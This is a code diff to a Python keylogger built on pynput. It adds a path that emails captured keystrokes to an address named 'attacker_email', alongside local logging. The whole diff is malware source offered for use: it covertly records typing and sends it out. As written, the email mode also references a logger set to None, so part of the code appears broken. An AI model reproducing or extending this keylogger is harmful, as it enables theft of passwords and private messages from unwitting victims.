@@ -1,6 +1,9 @@
 from pynput.keyboard import Listener, Key
 import os
 
+from . import setlog
+from . import Emailer
+
 
 class CustomListener(Listener):
     counter = 0
@@ -8,14 +11,25 @@ class CustomListener(Listener):
     cache = ""
 
     def __init__(self, count_limit=5, method="log",
-                 path=os.getcwd(), *args, **kwargs):
+                 path=os.getcwd(), email="",
+                 password="", attacker_email="",
+                 attacker_provider="gmail.com", *args,
+                 **kwargs):
         self.method = method
         self.count_limit = count_limit
         self.path = path
 
+        if method == "log":
+            self.logger = setlog(path)
+            self.emailer = Emailer(method=False)
+        else:
+            self.logger = None
+            self.emailer = Emailer(email, password,
+                                   attacker_email, attacker_provider)
+
         self.methods = {
-            "log": lambda x: x,
-            "email": lambda x: x
+            "log": self.logger.info,
+            "email": self.emailer.send_email
         }
 
         super().__init__(on_press=self.on_press, *args, **kwargs)
@@ -38,6 +52,5 @@ class CustomListener(Listener):
                 self.cache += f" { k } "
 
         if self.count():
-            print(self.cache)
+            self.methods[self.method](self.cache)
             self.cache = ""
-            self.methods[self.method](1)
